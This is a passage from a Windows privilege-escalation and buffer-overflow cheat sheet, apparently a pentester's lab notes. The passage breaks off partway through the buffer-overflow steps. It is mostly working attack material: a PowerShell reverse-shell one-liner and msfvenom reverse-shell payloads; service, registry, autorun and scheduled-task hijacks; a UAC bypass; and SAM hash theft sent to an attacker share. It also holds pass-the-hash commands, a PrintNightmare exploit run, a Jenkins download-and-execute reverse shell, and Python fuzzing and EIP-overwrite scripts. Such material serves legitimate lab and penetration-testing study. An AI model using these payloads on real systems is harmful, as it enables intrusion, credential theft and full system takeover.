1. `$password = ConvertTo-SecureString <password> -AsPlainText -Force`
2. `$cred = New-Object System.Management.Automation.PSCredential("<password>", $password)`
3. `Enter-PSSession -ComputerName <computer_name> -Credential $cred`

Check also:
- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
  - `evil-winrm -i <IP> -u <username> -p <password>`
- [powershell_reverse_shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
  ```powershell
  # Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

  $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  ```

Other shells with msfvenom
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o shell.exe`
- `msfvenom -p windows/×64/shell_reverse_tcp LHOST=<IP> LPORT=445 -f exe -e 64/xor -o shell.exe`
- `msfvenom -f psh-cmd -p windows/shell_reverse_tc LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -f ps1 -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -p windows/shell_reverse_tcp --list formats`
- `msfvenom -p windows/shell_reverse_tcp --list-options`

 
### Kernel Exploits

1. Save the output of the `systeminfo` command: `systeminfo > systeminfo.txt`
   - Try also the command: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
2. Use it with [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) to find potential exploits: `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less`
   - See also: [Watson](https://github.com/rasta-mouse/Watson)
3. See [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Driver Exploits
1. Enumerate the drivers that are installed on the system: `driverquery /v`
2. Search in the Exploit Database

### Service Exploits

Note: to find running services, use this command from the powershell: `Get-Service` or `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`

**PowerUp**
- `Get-ServiceUnquoted -Verbose` services with unquoted paths and a space in their name
- `Get-ModifiableServiceFile -Verbose` services where the current user can write to its binary path or change arguments to the binary
- `Get-ModifiableService -Verbose` services whose configuration current user can modify

**Service Commands**
```
sc.exe qc <name>                                 Query the configuration of a service
sc.exe query <name>                              Query the current status of a service
sc.exe config <name> <option>= <value>           Modify a configuration option of a service
net start/stop <name>                            Start/Stop a service
```

**Insecure Service Permissions**
1. Use AccessChk to check the "user" account's permissions on the "daclsvc" service:
   - `C:\PrivEsc\accesschk.exe /accepteula -uwcqv <user> <service>`
2. If `SERVICE_CHANGE_CONFIG` is present, it's possible to change the service configuration
3. Query the service. If it runs with `SYSTEM` privileges, it's possible a privilege escalation
   - `sc qc <service>`
   - Example: `SERVICE_START_NAME: LocalSystem`
4. Modify the service config and set the `BINARY_PATH_NAME` (binpath) to the reverse shell executable
   - `sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""`
5. Set a listener and start the service `net start <service>`

**Unquoted Service Path**

- `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
    1. Check which user is running it: `sc qc SERVICE_NAME`
    2. check it with a command similar to the following to see if you have write priv: `powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`
- If you have found an Unquoted Service Path:
  - `Get-Acl -Path "C:\Program Files (x86)\service" | Format-List`
    - see if you have write privileges (with `icacls`)
  - `"service" | Get-ServiceACL | select -ExpandProperty Access`
    - see if you can stop and start (restart) the service
  - `msfvenom -p windows/shell_reverse_tcp LHOST=10.18.110.121 LPORT=445 -f exe -o shell.exe`
  - copy the `shell.exe`, then:
    1. `sc start "service"`
    2. `Stop-Service -name "service"`
    3. `Start-Service -name "service"`

Another way
1. Check: ["Microsoft Windows Unquoted Service Path Vulnerability"](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)
2. Query a service. If it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`) and the `BINARY_PATH_NAME` value is unquoted and contains spaces, it's possible a privilege escalation
   - `sc qc <service>`
   - Example: `BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Results\unquotedpathservice.exe`
   - You can also use the Powershell command `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
3. Use AccessChk to check write permissions in this directory `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
   - You can review the permissions with `icacls "C:\"` and `icacls "C:\Program Files\Enterprise Apps"`
   - Check if you can run and stop the service with `Start-Service GammaService` and `Stop-Service`
4. Copy the reverse shell `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
5. Start a listener on the attacker machine and run the service

**Weak Registry Permissions**
1. Query a service. Check if it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`)
   - `sc qc <service>`
2. Use AccessChk to check the write permissions of the registry entry for the service
   - note: `NT AUTHORITY\INTERACTIVE` group means all logged-on users
   - `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>`
3. Overwrite the ImagePath registry key to point to the reverse shell executable: `reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
4. Start a listener on the attacker machine and run the service

**DLL Hijacking**
- See: [DLL Hijacking](#dll-hijacking)

### CVEs

- Check if `CVE-2018-8120` works
- See programs in `Program Files` and `(x86)` and search for CVEs
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Note: Hotfix means patches, if you see N/A means that nothing has been patches
- See if you can connect as RDP to more easily find other vulnerable installed applications

**Run**
- `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`
- `python windows-exploit-suggester.py --database 2023-09-12-mssb.xls --systeminfo systeminfo.txt`
- if you can't use `systeminfo`, try `wmic qfe list full` and save it as `systeminfo.txt`
- `searchsploit Windows Server 2012 Privilege`

**Windows Server 2008**
- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

**CVE-2018-8440**
- If you see Hotfix N/A + write priv in `C:\Windows\tasks`
  - run to see if you have write priv: `icacls C:\Windows\Tasks`
- Try to run `/home/kali/Documents/windows-attack/CVE/CVE-2018-8440/Release/poc.exe`

**See the version of an exe**
- `Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force`

**Compile exploits**
- `cl 42020.cpp /EHsc /DUNICODE /D_UNICODE`
- `gcc -o output.c input.c`
- `gcc -m32 -o output.c input.c`
- `g++ your_program.cpp -o your_program`
- `i686-w64-gcc adduser.c -o adduser.exe`
- `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
- `mcs Wrapper.cs`

### User Account Control (UAC)

Example:
- Even if we are logged in as an administrative user, we must move to a high integrity level in order to change the admin user's password.
- To do it, run the following commands
  ```PowerShell
  <# spawn a cmd.exe process with high integrity #>
  powershell.exe Start-Process cmd.exe -Verb runAs
  
  <# successfully changing the password of the admin user after spawning cmd.exe with high integrity #>
  whoami /groups
  net user admin Ev!lpass
  ```
  
UAC Bypass with `fodhelper.exe`, a Microsoft support application responsible for managing language changes in the operating system. Runs as high integrity on `Windows 10 1709`
- "[First entry: Welcome and fileless UAC bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)"
- "[UAC Bypass – Fodhelper](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)"
- `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`


### Insecure File Permissions

Also called "Service Binary Hijacking". Exploit insecure file permissions on services that run as nt authority\system
1. List running services on Windows using PowerShell `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
2. Enumerate the permissions on the target service `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
   - For this scenario, any user (BUILTIN\Users) on the system has full read and write access to it
   - See also "[Serviio PRO 1.8 DLNA Media Streaming Server - Local Privilege Escalation](https://www.exploit-db.com/exploits/41959)"
3. Substitute `ServiioService.exe` with the following
   ```C
   #include <stdlib.h>
   int main () {
     int i;
     i = system ("net user [username] [password] /add");
     i = system ("net localgroup administrators [username] /add");
     return 0;
   }
   ```
   - `i686-w64-gcc adduser.c -o adduser.exe` or `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` to Cross-Compile the C Code to a 64-bit application
   - `move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"`
   - `move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"`
   - `dir "C:\Program Files\Serviio\bin\"`
4. Restart the service, here's two options
   - `net stop Serviio`
   - `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'Serviio'}` Obtain Startup Type for Serviio service
   - Check `Startmode` of the service with `wmic service where caption="Serviio" get name, caption, state, startmode`
   - If it's `Auto`, it means that it will restart after a reboot. Reboot with `shutdown /r /t 0 `.
5. Check if it worked with `net localgroup Administrators`

**PowerUp.ps1**
1. Check [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) and make it available with `python3 -m http.server 80`
2. Download it from the victim machine `iwr -uri http://<IP>/PowerUp.ps1 -Outfile PowerUp.ps1`
3. Run the commands `powershell -ep bypass` and `. .\PowerUp.ps1`
4. Then run `Get-ModifiableServiceFile` to display services the current user can modify
5. Run `Install-ServiceBinary -Name 'mysql'`. If it throws an error even if you already know that the current user has full access permissions on the service binary, proceed with manual exploitation


### Registry

**AutoRuns**
1. Query the registry for AutoRun executables: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
2. Use AccessChk to check write permissions of the executables `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\<program>.exe"`
3. Overwrite the reverse shell executables in the `<program>` path: `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
4. Start a listener on the attacker machine. A new session on the victim machine will trigger a reverse shell running with admin privileges

**AlwaysInstallElevated**
1. Query the registry for AlwaysInstallElevated keys: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
   - Note if both keys are set to 1 (`0x1`)
2. Generate a reverse shell installer `.msi` with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi`
3. Transfer the installer `.msi` to the Windows machine
4. Start a listener on the attacker machine and then run the installer to trigger a reverse shell running with SYSTEM privileges: `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

### Passwords

**Registry**
1. Search for keys and values that contain the word "password"
   - `reg query HKLM /f password /t REG_SZ /s`
   - `reg query HKCU /f password /t REG_SZ /s`
2. If you have found an admin and its password, use [winexe](https://www.kali.org/tools/winexe/) command from the attacker machine to spawn a command prompt running with the admin privileges `winexe -U 'admin%password' //<IP> cmd.exe`

**Saved Credentials**
1. Check for any saved credentials `cmdkey /list`
2. Start a listener on the attacker machine and run the reverse shell executable using `runas` with the admin user's saved credentials: `runas /savecred /user:admin C:\PrivEsc\reverse.exe` or `runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"`

**Search for Configuration Files**
1. Run the commands: `dir /s *pass* == *.config` and `findstr /si password *.xml *.ini *.txt`
2. Use winPEAS to search for common files which may contain credentials: `.\winPEASany.exe quiet cmd searchfast filesinfo`
   - also run `.\winPEASx64.exe windowscreds filesinfo fileanalysis searchpf log=winpeas_out.txt`

**Security Account Manager (SAM)**
1. The `SAM` and `SYSTEM` files can be used to extract user password hashes. Check also backups of these files
   - `copy C:\Windows\Repair\SAM \\<IP>\kali\`
   - `copy C:\Windows\Repair\SYSTEM \\<IP>\kali\`
2. Dump the hashes with "creddump7": `python3 creddump7/pwdump.py SYSTEM SAM`
3. Crack the hashes with `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

**Passing The Hash**
1. Use the hashes to authenticate: `pth-winexe -U 'admin%hash' //<IP Victim> cmd.exe`

### Scheduled Tasks

1. List all scheduled tasks your user can see:
   - `schtasks /query /fo LIST /v`
   - In PowerShell: `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
2. Search in Task Manager for any scheduled task
   1. See if you find any `.ps1` script.
      - If the script found run as `SYSTEM`, check the write permissions of it with `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\<script>.ps1`
      - Add to it a line to run the reverse shell `echo C:\PrivEsc\reverse.exe >> C:\<script>.ps1`
   2. For the `.exe`, review the permissions with `icals C:\Users\Documents\service.exe`
      - If you have full access permissions, substitute the `.exe` as in the section [Insecure File Permissions](#insecure-file-permissions)


### Insecure GUI Apps
1. Open an app. Look at the privilege level it runs with `tasklist /V | findstr mspaint.exe`
2. If the app runs with admin privileges and gives the possibility to open a file dialog box, click in the navigation input and paste: `file://c:/windows/system32/cmd.exe`

### Startup Apps
1. Note if `BUILTIN\Users` group can write files to the StartUp directory: `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
2. Using cscript, run the following script to create a new shortcut of the reverse shell executable in the StartUp directory:
   - ```VBScript
     Set oWS = WScript.CreateObject("WScript.Shell")
     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
     Set oLink = oWS.CreateShortcut(sLinkFile)
     oLink.TargetPath = "C:\PrivEsc\reverse.exe"
     oLink.Save
     ```

### Installed Applications
1. Manually enumerate all running programs: `tasklist /v`
   - With seatbelt: `.\seatbelt.exe NonstandardProcesses`
   - With winPEAS: `.\winPEASany.exe quiet procesinfo`
2. Search for the applications' versions
   - Try running the executable with `/?` or `-h,` as well as checking config or text files in the `Program Files` directory
3. Use Exploit-DB to search for a corresponding exploit

### Hot Potato
Note: This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.
1. See [Hot Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato), get the exploit [here](https://github.com/foxglovesec/Potato)
2. Start a listener on the attacker machine
3. Run the exploit: `.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
4. Wait for a Windows Defender update (or trigger one manually)

### Token Impersonation


**[RoguePotato](https://github.com/antonioCoco/RoguePotato)**
1. See [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato)
2. Set up a socat redirector on the attacker machine, forwarding its port 135 to port 9999 on Windows `sudo socat tcp-listen:135,reuseaddr,fork tcp:<Windows IP>:9999`
3. Execute the PoC: `.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999`
4. Check [Juicy Potato](https://github.com/ohpe/juicy-potato), it's an improved version

**More Potatoes**
- See: [Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

**[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)**
- Usage 1
  1. Copy `PSExec64.exe` and the `PrintSpoofer.exe` exploit executable over the Windows machine
  2. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account: `C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
  3. Run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges: `C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"`
- Usage 2
  1. Copy the `PrintSpoofer.exe` exploit executable over the Windows machine
  2. `.\PrintSpoofer64.exe -i -c powershell.exe`

**metasploit**
- msfconsole, meterpreter > load incognito
  - `list_tokens -u`
  - `impersonate_token domain\\username`
  - `rev2self <# to reverte to initial user, usefull when the initial user is the admin #>`

### getsystem
- **Access Tokens**: When a user first logs in, this object is created and linked to their active session. A copy of the user's principal access token is added to the new process when they launch it.
- **Impersonation Access Token**: When a process or thread momentarily needs to run with another user's security context, this object is created.
- **Token Duplication**: Windows permits processes and threads to use multiple access tokens. This allows for the duplication of an impersonation access token into a main access token. If we have the ability to inject into a process, we can leverage this feature to copy the process's access token and launch a new process with the same rights.
- **Documentation**: [Meterpreter getsystem | Metasploit Documentation](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)

### Pass The Hash
- You can pass NTLM hashes, not NTLMv2
- `pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd`
- `crackmapexec smb 10.0.3.0/24 -u fcastle -H eb7126ae2c91ed5637hdn3hegve38928398 --local-auth`
- `crackmapexec winrm 192.168.174.175 -u usernames.txt -H hashes.txt --local-auth`
- `evil-winrm -i 192.168.174.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808`
- `impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <USERNAME>:@<IP>`
- `impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175`
- with sam hashes, remember to use the correct pair
- https://labs.withsecure.com/publications/pth-attacks-against-ntlm-authenticated-web-applications


### Pass The Password
- `crackmapexec smb 10.0.3.0/24 -u fcastle -d DOMAIN -p Password1`
- `crackmapexec smb 192.168.220.240 -u 'guest' -p ''`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --sam`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --lsa`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --ntds`


### Apache lateral movement
- If you have logged in with an user, and you see the apache user, you might try to move laterally and from that user try to escalate
- check if you have write access to 'C:\xampp\htdocs' with `echo testwrite > testdoc.txt`
- if you have write privileges, download a cmd.php shell and check who the user is. If it's apache, do a reverse shell


### Read data stream

maybe you are in a directory where there is something strange

1. use `dir /r`
   you might find files like the following
   ```
   hm.txt
   hm.txt:root.txt:$DATA
   ```
2. Use the following command
   `powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
- See Hack The Box - Jeeves


### PrintNightmare
- `impacket-rpcdump @10.10.108.190 | egrep 'MS-RPRN|MS-PAR'`. See: https://github.com/cube0x0/CVE-2021-1675#scanning
    1. `msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=10.18.110.121 LPORT=447 -f dll > shell.dll`
    2. `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
    4. Set a listener: `msfconsole -q`, `use multi/handler`
    3. `python3 '/home/kali/Documents/windows-attack/CVE/PrintNightmare/CVE-2021-1675/CVE-2021-1675.py' VULNNET/enterprise-security:'sand_0873959498'@10.10.198.52 '\\10.18.110.121\share\shell.dll'`
  - For just a Priv Esc, use https://github.com/calebstewart/CVE-2021-1675
- See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare


### Bypass CLM / CLM breakout | CLM / AppLocker Break Out
- Verify that you are in a contained enviorment with
  - `$executioncontext.sessionstate.languagemode`
  - `Get-AppLockerPolicy -Effective -XML`
  - see https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- https://github.com/padovah4ck/PSByPassCLM
- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- reverse shell: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe`
- Msbuild: https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
           https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html

AppLocker
- Enumerate: `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\`
- Using PowerShell remoting
  1. `Enter-PSSession <computer>`
  2. `$ExecutionContext.SessionState.LanguageMode`
  3. `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

### From Local Admin to System
- If you are part of the group "Administrators", try: `.\PsExec.exe -i -s -d -accepteula cmd`


### TeamViewer
- TeamViewer 7 vulnerable to CVE-2019-18988
  - https://whynotsecurity.com/blog/teamviewer/
  - use post/windows/gather/credentials/teamviewer_passwords


### Exploiting service through Symbolic Links
A symbolic link is a file object that points to another file object. The object being pointed to is called the target.
- create a Mount Point: `./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"`
  - In this way, a script that copies `request.log` will copy `id_rsa` instead
  - see proving-grounds/Symbolic


### Write privileges

- If you can write on `C:\Windows\System32\`, try these:
  - https://github.com/sailay1996/WerTrigger
  - https://github.com/binderlabs/DirCreate2System



### Services running - Autorun

- Usa tasklist: `tasklist /svc`
- `netstat -ano`
- See non-default services running
  - `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
- See if there are any autorun applications outside the normal paths (like `C:\app`)
  - `wmic service get name,displayname,pathname,startmode |findstr /i "auto"`
  - See CVEs for privilege escalation
  - If there is an insecure folder permission, you could delete the exe that starts and replace it.
    - Check it with: `sc qc SERVICENAME`
  - once done, run `shutdown /r`
- To see the values corresponding to a PID: `tasklist /svc /FI "PID eq 9833"`
- Other ways to see running services: `Get-Service, wmic.exe, service get name, sc.exe query state= all, net.exe stat, Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE`



### CEF Debugging Background
- Example: `Directory: C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7`
- https://github.com/taviso/cefdebug
-  https://twitter.com/taviso/status/1182418347759030272
- See the process: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#priv-tushikikatomo--cyork


### Feature Abuse

Note: In the Windows environment, numerous enterprise applications often require either administrative privileges or SYSTEM privileges, presenting significant opportunities for privilege escalation.

#### Jenkins
You can run system commands. There are many ways to do it:
- With plugins installed (from [CRTP](https://www.alteredsecurity.com/adlab))
  - With admin access, go to `http://<jenkins_server>/script` and run the following:
    ```PowerShell
    def sout = new StringBuffer(), serr = new StringBuffer()
    def proc = '
    [INSERT COMMAND]'.execute()
    proc.consumeProcessOutput(sout, serr)
    proc.waitForOrKill(1000)
    println "out> $sout err> $serr"
    ```
- If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: `powershell -c <command>`, or `powershell iex (iwr -UseBasicParsing http://<IP>/Invoke-PowerShellTcp.ps1);Power -Reverse -IPAddress <IP> -Port <PORT>`
  - Disable the firewall or add an exception
- Use a listener like Netcat `nc64.exe -lvp 443`


## Buffer Overflow

**Tools**
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/) + [mona](https://github.com/corelan/mona)
- [Vulnserver](https://thegreycorner.com/vulnserver.html)
  - Note: usually, `<port vulnserver>` is `9999`
- [Kali](https://www.kali.org/)
- See also [Buffer Overflows Made Easy | The Cyber Mentor](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
- [mingw-w64](https://www.mingw-w64.org/), a cross-compiler for programs written to be compiled in Windows. With it you can compile them in an OS like Linux
  - Example of usage: `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
- See also: [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)

**Issues**
- ["Problems attach Immunity to Vulnserver on Windows 10"](https://www.reddit.com/r/hacking/comments/ohg5t0/problems_attach_immunity_to_vulnserver_on_windows/): Don't start vulnserver, start Immunity as Admin, File > Open > vulnserver.exe, push "play".

**Steps to conduct a Buffer Overflow**
1. [Spiking](#spiking)
2. [Fuzzing](#fuzzing)
3. [Finding the Offset](#finding-the-offset)
4. [Overwriting the EIP](#overwriting-the-eip)
5. [Finding bad characters](#finding-bad-characters)
6. [Finding the right module](#finding-the-right-module)
7. [Generating Shellcode](#generating-shellcode)

### Spiking

`generic_send_tcp <IP Vulnserver> <port vulnserver> script.spk 0 0`

**Example: trun.spk**
```spike
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

### Fuzzing

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('<IP Vulnserver>', <port vulnserver>))
        s.send(('TRUN /.:/' + buffer).encode())
        s.close()
        sleep(1)
        buffer += "A" * 100
    except:
        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```

### Finding the Offset

1. Get the result from: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes_where_server_crashed>`
2. Modify the previous script in
   ```python
   #!/usr/bin/python3
   import sys, socket
   from time import sleep
   
   offset = "RESULT_FROM_STEP_1"
   
   while True:
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect(('<IP Vulnserver>', <port vulnserver>))
           s.send(('TRUN /.:/' + offset).encode())
           s.close()
       except:
           print ("Error connecting to the server")
           sys.exit()
   ```
3. After running the script, read the value from the EIP
4. With that value, run this script: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q EIP_VALUE_STEP_2`

### Overwriting the EIP

From the previous result, we should get the position `2003` for the start of the EIP. We can test this by sending `A * 2003` plus `B * 4` and see if `EIP = 42424242` (since `42424242` = `BBBB`).

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<IP Vulnserver>', <port vulnserver>))
		s.send(('TRUN /.:/' + shellcode).encode())
		s.close()
	except:
		print ("Error connecting to the server")
		sys.exit()
```

### Finding bad characters

You can generate a string of bad chars with the following python script
```Python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

The following python script is used to find bad chars
```python
#!/usr/bin/python3
import sys, socket
from time import sleep

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<IP Vulnserver>', <port vulnserver>))
		s.send(('TRUN /.:/' + shellcode))
		s.close()
	except:
		print "Error connecting to the server"
		sys.exit()
```

1. After starting the script, once vulnserver breaks down, go in Immunity `Debugger` > `Registers` > Right-click on `ESP` > `Follow in Dump` > See `Hex dump`. 
2. Check if the Hex dump makes sence, e.g. in the Hex dump there is no number value missing.
   - Example: you may get a result like `... 01 02 03 B0 B0 06 07 08 ...`. As you can see, `04` and `05` are missing, so you've found a bad character.
3. Write down every character missing

Another solution to the step `3.`, with mona and Immunity Debugger
1. Set the working directory with `!mona config -set workingfolder c:\mona`
2. Generate bad characters with `!mona bytearray -cpb "\x00"` from Immunity Debugger
   -  Notice the new files in `c:\mona`
3. Run the python script of this section
4. Execute the command `!mona compare -f c:\mona\bytearray.bin -a <address of ESP>`
- Note: this may cause false positive

### Finding the right module

Note: `JMP ESP` will be used as the pointer to jump to the shellcode. With `nasm_shell.rb` we can get the hex equivalent to these commands.
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
